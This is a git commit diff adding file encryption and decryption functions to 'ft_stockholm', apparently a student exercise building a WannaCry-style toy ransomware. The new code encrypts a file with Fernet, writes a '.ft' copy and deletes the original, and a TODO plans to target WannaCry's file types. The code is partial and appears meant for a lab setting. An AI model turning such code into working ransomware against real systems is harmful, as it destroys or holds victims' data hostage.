365615be0038ff9f93fd5164400f6dd8e007fd88
mug4z <mug4z@protonmail.com>
2026-06-08 12:02:16 +0200

    feat(ft_stockholm): encrypt and decrypt function

--- ft_stockholm/stockholm.py
+++ ft_stockholm/stockholm.py
@@ -1,47 +1,15 @@
 #!/usr/bin/env python3
 
+# TODO: The key is generated or given as arguments to encrypt, of course for decrypt the key is needed.
 # TODO: encrypt
 # TODO: decrypt
 # TODO: Target all the file targeted by wannacry
 
 import argparse
 import os
+from typing import Any
 
 from cryptography.fernet import Fernet
-from cryptography.hazmat.primitives.kdf.argon2 import Argon2id
-
-def kdf():
-    salt = os.urandom(16)
-    kdf = Argon2id(
-        salt=salt,
-        length=32,
-        iterations=1,
-        lanes=4,
-        memory_cost= 64 * 1024,
-        ad=None,
-        secret=None
-    )
-    key = kdf.derive(b"LOL")
-    print(key)
-    with open('ft_stockholm.key','wb') as file:
-        file.write(key)
-    kdf = Argon2id(
-        salt=salt,
-        length=32,
-        iterations=1,
-        lanes=4,
-        memory_cost= 64 * 1024,
-        ad=None,
-        secret=None
-    )
-    kdf.verify(b"LOL",key)
-
-def verify_key(path_to_key: str):
-
-
-
-
-    
 
 def get_content_file(path_to_file: str) -> bytes:
     content = None
@@ -50,13 +18,28 @@ def get_content_file(path_to_file: str) -> bytes:
         file.close()
     return content
 
-def encrypt(path_to_file: str, key: bytes):
+def write_content_file(path_to_file: str, content: Any):
+    with open(path_to_file, 'wb') as file:
+        content = file.write(content)
+        file.close()
+
+def remove_file(path_to_file: str):
+    os.remove(path_to_file)
+
+def encrypt_file(path_to_file: str, key: bytes):
     try:
         f = Fernet(key)
-        f.encrypt(get_content_file(path_to_file))
+        token = f.encrypt(get_content_file(path_to_file))
+        write_content_file(path_to_file + ".ft",token)
+        remove_file(path_to_file)
     except Exception as e:
         print(f"Failed for {e}")
-    
+
+def decrypt_file(file_to_decrypt: str, key: bytes):
+        f = Fernet(key)
+        content_to_decrypt = get_content_file(file_to_decrypt)
+        write_content_file(file_to_decrypt, f.decrypt(content_to_decrypt))
+        # return f.decrypt(content_to_decrypt)
 
 
 def main():
@@ -64,8 +47,12 @@ def main():
     # parser.add_argument("-g","--hex-key",help="The path of the key file, must be at least 64 character in hexadecimal")
     # parser.add_argument("-k","--gen-password",action="store_true",help="generate a new temporary password")
     # args = parser.parse_args()
-    # encrypt("Makefile_to_c",b"LOLOLOLOLOLOLOLOL")
-    kdf()
+    key = Fernet.generate_key()
+    print(key)
+    # encrypt_file("Makefile_to_c",key)
+    decrypt_file("Makefile_to_c.ft",b'LmXY5Ljf8EFk8zFeKAr4oWlyptDgsI3M0dSACeJfK_E=')
+
+    # kdf()
 
 
 
